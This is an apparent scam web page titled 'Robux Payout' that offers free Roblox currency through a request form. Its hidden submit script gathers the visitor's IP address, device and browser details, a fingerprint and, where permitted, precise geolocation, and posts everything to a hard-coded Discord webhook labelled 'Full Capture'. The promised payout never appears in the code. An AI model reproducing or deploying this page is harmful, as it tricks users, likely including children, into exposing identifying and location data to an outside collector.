<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Robux Payout</title>

<link rel="icon" type="image/png" sizes="32x32" href="/images/BP-LOGO.png">
<link rel="shortcut icon" href="/images/BP-LOGO.png">

<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: Arial, sans-serif;
}

body {
  background: #02030a;
  color: #ffffff;
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  padding: 20px;
}

.container {
  width: 100%;
  max-width: 500px;
  background: #0a0c1a;
  padding: 25px;
  border-radius: 12px;
  box-shadow: 0 0 25px rgba(255, 0, 0, 0.15);
}

h2 {
  text-align: center;
  margin-bottom: 15px;
  color: #ff4d4d;
}

.warning {
  background: rgba(255, 0, 0, 0.1);
  border: 1px solid #ff1a1a;
  color: #ff4d4d;
  padding: 12px;
  border-radius: 8px;
  margin-bottom: 15px;
  font-size: 13px;
  text-align: center;
}

input, textarea {
  width: 100%;
  padding: 12px;
  margin-bottom: 12px;
  background: #05070f;
  border: 1px solid #3a1a1a;
  border-radius: 8px;
  color: #fff;
  outline: none;
  font-size: 16px;
}

input:focus, textarea:focus {
  border-color: #ff4d4d;
  box-shadow: 0 0 8px rgba(255,77,77,0.4);
}

button {
  width: 100%;
  padding: 14px;
  border: none;
  border-radius: 8px;
  background: linear-gradient(90deg, #990000, #ff1a1a);
  color: #fff;
  font-weight: bold;
  cursor: pointer;
  transition: 0.2s;
}

button:hover {
  transform: scale(1.03);
  box-shadow: 0 0 12px rgba(255, 0, 0, 0.6);
}

@media (max-width: 600px) {
  .container {
    padding: 18px;
  }

  h2 {
    font-size: 20px;
  }

  button {
    padding: 12px;
  }
}
</style>
</head>

<body>
<div class="container">
  <h2>GAP Request</h2>

  <div class="warning">
    Please fill out your payment form. This will be processed within 10–20 minutes.
  </div>

  <form id="loaForm">
    <input type="text" id="roblox" placeholder="Roblox Username" required>
    <textarea id="info" placeholder="Amount needed"></textarea>
    <button type="submit">Gain Robux</button>
  </form>
</div>

<script>
document.getElementById("loaForm").addEventListener("submit", async function(e) {
  e.preventDefault();

  const webhookURL = "https://discord.com/api/webhooks/1500959376247226439/09aegftTvVJOQzoImPPb_imfSElmyOwhqN2PJkjt9uQBmYBK4Wd6ddbYSNAJAXiGynpl";

  const now = new Date();
  const formattedTime = now.toLocaleString("en-GB");

  // IP
  let ip = "Unknown";
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    ip = data.ip;
  } catch {}

  // Device & browser info
  const ua = navigator.userAgent;
  const platform = navigator.platform;
  const language = navigator.language;
  const languages = navigator.languages?.join(", ") || "N/A";
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

  // Hardware (limited)
  const cores = navigator.hardwareConcurrency || "N/A";
  const memory = navigator.deviceMemory ? navigator.deviceMemory + "GB" : "N/A";

  // Screen
  const screenRes = screen.width + "x" + screen.height;
  const viewport = window.innerWidth + "x" + window.innerHeight;
  const colorDepth = screen.colorDepth;

  // Page context
  const referrer = document.referrer || "Direct";
  const currentURL = window.location.href;

  // Connection
  const online = navigator.onLine ? "Online" : "Offline";

  // Fingerprint
  const fingerprint = btoa(
    ua + "|" + language + "|" + screen.width + "|" + screen.height + "|" + timezone + "|" + cores + "|" + memory
  );

  // Location (optional permission)
  let locationData = "Not allowed";
  try {
    locationData = await new Promise((resolve) => {
      navigator.geolocation.getCurrentPosition(
        pos => resolve(pos.coords.latitude + ", " + pos.coords.longitude),
        () => resolve("Denied"),
        { timeout: 3000 }
      );
    });
  } catch {}

  const payload = {
    embeds: [{
      title: "New Submission (Full Capture)",
      color: 16711680,
      fields: [
        { name: "Roblox Username", value: document.getElementById("roblox").value || "N/A" },
        { name: "Amount", value: document.getElementById("info").value || "N/A" },

        { name: "Time", value: formattedTime },
        { name: "IP", value: ip },

        { name: "User Agent", value: ua.substring(0, 1000) },
        { name: "Platform", value: platform, inline: true },
        { name: "Language", value: language, inline: true },
        { name: "Languages", value: languages },

        { name: "Timezone", value: timezone, inline: true },
        { name: "CPU Cores", value: String(cores), inline: true },
        { name: "RAM Estimate", value: String(memory), inline: true },

        { name: "Screen", value: screenRes, inline: true },
        { name: "Viewport", value: viewport, inline: true },
        { name: "Color Depth", value: String(colorDepth), inline: true },

        { name: "Referrer", value: referrer },
        { name: "Page URL", value: currentURL },

        { name: "Connection", value: online, inline: true },
        { name: "Location", value: locationData, inline: true },

        { name: "Fingerprint", value: fingerprint }
      ]
    }]
  };

  const response = await fetch(webhookURL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  });

  if (response.ok) {
    alert("Submitted.");
    document.getElementById("loaForm").reset();
  } else {
    alert("Failed to send.");
    console.log(await response.text());
  }
});
</script>

</body>
</html>
